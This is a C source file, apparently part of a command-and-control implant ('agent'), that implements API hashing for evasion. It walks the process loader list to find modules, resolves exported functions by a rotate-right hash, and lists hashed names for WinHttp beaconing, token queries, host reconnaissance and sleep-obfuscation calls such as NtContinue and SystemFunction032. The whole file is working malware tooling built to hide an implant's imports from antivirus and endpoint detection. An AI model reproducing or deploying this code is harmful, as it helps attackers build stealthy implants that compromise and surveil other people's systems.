#include "evasive.h"


// Function to rotate the bits of a 64-bit unsigned integer to the right
UINT64 Rotr64(UINT64 value, UINT count) {
    const UINT mask = 8 * sizeof(value) - 1;
    count &= mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (value >> count) | (value << ((-count) & mask));
#pragma warning( pop ) 

}

// Simple Rotr64 hash function for strings
UINT64 Rotr64HashA(const LPSTR str) {
    UINT64 hash = 0;
    for (int i = 0; i < StringLengthA(str); i++) {
        // Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
    }
    return hash;
}

UINT64 Rotr64HashW(const LPWSTR str) {
	UINT64 hash = 0;
	for (int i = 0; i < StringLengthW(str); i++) {
		// Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
	}
	return hash;
}
/*
****Hashing Order****

DllNameHashes = {
0xAF6973267322CEF1, //KERNEL32.DLL
0xD99176CD993A6E6C, //ntdll.dll
}
ApiNameHashes = {
0x27C27F0E9D246F42, //WinHttpOpen
0xEB0E11CDF0F8755D, //WinHttpConnect
0x271EFDAEEC211456, //WinHttpOpenRequest
0x371EFDAEEC1C1D40, //WinHttpSendRequest
0xB34C34E468B2D450, //WinHttpSetOption
0x61B35AE1647C5613, //WinHttpAddRequestHeaders
0x5849BC331DE4F77, //WinHttpReceiveResponse
0xBC2634B9D6ABC69B, //WinHttpQueryHeaders
0xBBCD1381F969714B, //WinHttpReadData
0xE91AC4AB50E39E3E, //WinHttpCloseHandle
0x934CBF2CB5BA65FE, //RtlGetVersion
0xE7BF643E93800065, //NtClose
0x96366A0AA4E7804E, //NtOpenProcessToken
0x1F25DB6092C0F340, //NtOpenThreadToken
0x30650DA980EEDACA, //NtQueryInformationToken
0x75A514F31871F04A, //RtlAllocateHeap
0x75A4A0B9D2C3F04A, //RtlReAllocateHeap
0xD3B77E4DD8696D61, //RtlRandomEx
0x7416C5FD78F4D55E, //NtGetTickCount
0x5FC99BF0197A7133, //GetAdaptersInfo
0x61EF0CEE5979D62B, //GetUserNameA
0xC89E0CCD2E1EF42B, //GetComputerNameExA
0xDFB3641D9871EFFB, //LocalAlloc
0x9E13641CB4B6622B, //LocalReAlloc
0xCBCA36CC38F7CC65, //LocalFree
0xB22B0F2C5A666505, //LoadLibraryA
0x2B3DEF2C9071F059, //GetProcAddress
0x71DEA6CC38F7CD4F, //GetLocalTime
0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
0x9774D5E616F6E65D, //GetSystemMetrics
}
*/

LPVOID RetrieveModuleHandleFromHash(UINT64 hash) {
    P_INT_LDR_DATA_TABLE_ENTRY pModule = (P_INT_LDR_DATA_TABLE_ENTRY)((P_INT_PEB)agent->pTeb->ProcessEnvironmentBlock)->Ldr->InMemoryOrderLinks.Flink;
    P_INT_LDR_DATA_TABLE_ENTRY pFirstModule = pModule;

    do
    {
		UINT64 moduleNameHash = Rotr64HashW(pModule->BaseDllName.Buffer);
		if (moduleNameHash == hash) {
			return pModule->DllBase;
		}
		pModule = (P_INT_LDR_DATA_TABLE_ENTRY)pModule->InLoadOrderLinks.Flink;

	} while (pModule && pModule != pFirstModule);

    return INVALID_HANDLE_VALUE;
}

LPVOID RetrieveFunctionPointerFromhash(HMODULE Module, UINT64 Hash) {
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
	PDWORD pAddressOfFunctions = NULL;
	PDWORD pAddressOfNames = NULL;
	PWORD pAddressOfNameOrdinals = NULL;


    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)Module + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	pAddressOfFunctions = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfFunctions);
	pAddressOfNames = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfNames);
	pAddressOfNameOrdinals = (PWORD)((LPBYTE)Module + pExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        //TODO remove debug statements
    	//printf("FunctionName: %s\n", (LPSTR)((LPBYTE)Module + pAddressOfNames[i]));
		UINT64 functionNameHash = Rotr64HashA((LPSTR)((LPBYTE)Module + pAddressOfNames[i])); // there could be issues here because i used WSTR to generate hashes. Here we're using ASTR
    	//printf("FunctionNameHash: 0x%llX\n", functionNameHash);
        if (functionNameHash == Hash) {
            DWORD funcRVA = pAddressOfFunctions[pAddressOfNameOrdinals[i]];
			return (LPVOID)((LPBYTE)Module + funcRVA);
		}
	}
	return NULL;
}

PVOID GetModuleBaseAddr(_In_ UINT64 Hash)
{
    P_INT_LDR_DATA_TABLE_ENTRY Ldr = NULL;
    PLIST_ENTRY Hdr = NULL;
    PLIST_ENTRY Ent = NULL;
    P_INT_PEB Peb = NULL;

    Peb = agent->pTeb->ProcessEnvironmentBlock;
    Hdr = &Peb->Ldr->InMemoryOrderLinks;
    Ent = Hdr->Flink;

    // cycle through the doubly linked list until we reach the first link.
    for (; Hdr != Ent; Ent = Ent->Flink)
    {
        Ldr = Ent;

        if ((Rotr64HashW(Ldr->BaseDllName.Buffer) == Hash) || Hash == 0)
            return Ldr->DllBase;

    }

    return NULL;

}

DWORD GetImageSize(_In_ PVOID ModuleBase)
{
	PIMAGE_DOS_HEADER DosHdr = NULL;
	PIMAGE_NT_HEADERS NtHdr = NULL;

	DosHdr = (PIMAGE_DOS_HEADER)ModuleBase;
	NtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)ModuleBase + DosHdr->e_lfanew);

	return NtHdr->OptionalHeader.SizeOfImage;
    
}

//TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
void printhashes() {

    UINT64 hash = 0;

    LPWSTR DllNames[] = {
		L"KERNEL32.DLL",
		L"ntdll.dll",
		L"user32.dll",
		L"advapi32.dll",
		L"winhttp.dll",
		L"iphlpapi.dll"
	};
	printf("DllNameHashes = {\n");
	for (int i = 0; i < sizeof(DllNames) / sizeof(DllNames[0]); i++) {
		hash = Rotr64HashW(DllNames[i]);
		printf("0x%llX, //%ls\n", hash, DllNames[i]);
	}
    printf("}\n");
    LPSTR apiNames[] = {
        "WinHttpOpen",
        "WinHttpConnect",
        "WinHttpOpenRequest",
        "WinHttpSendRequest",
        "WinHttpSetOption",
        "WinHttpAddRequestHeaders",
        "WinHttpReceiveResponse",
        "WinHttpQueryHeaders",
        "WinHttpReadData",
        "WinHttpCloseHandle",
        "RtlGetVersion",
        "NtClose",
        "NtOpenProcessToken",
        "NtOpenThreadToken",
        "NtQueryInformationToken",
        "RtlAllocateHeap",
        "RtlReAllocateHeap",
        "RtlRandomEx",
        "NtGetTickCount",
        "GetAdaptersInfo",
        "GetUserNameA",
        "GetComputerNameExA",
        "LocalAlloc",
        "LocalReAlloc",
        "LocalFree",
        "LoadLibraryA",
        "GetProcAddress",
        "GetLocalTime",
        "GetSystemTimeAsFileTime",
        "GetSystemMetrics",
        "RtlCreateTimerQueue",
        "NtCreateEvent",
        "RtlCaptureContext",
        "RtlCreateTimer",
        "RtlRegisterWait",
        "RtlDeleteTimerQueue",
        "RtlCopyMappedMemory",
        "NtWaitForSingleObject",
        "NtSignalAndWaitForSingleObject",
        "NtContinue",
        "NtSetEvent",
        "NtSetContextThread",
        "NtDuplicateObject",
        "VirtualProtect",
        "SystemFunction032",
        "WaitForSingleObjectEx",
        "SystemFunction033",
        
    };
	printf("ApiNameHashes = {\n");
	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
		hash = Rotr64HashA(apiNames[i]);
        printf("0x%llX, //%s\n", hash, apiNames[i]);
	}
	printf("}\n");
}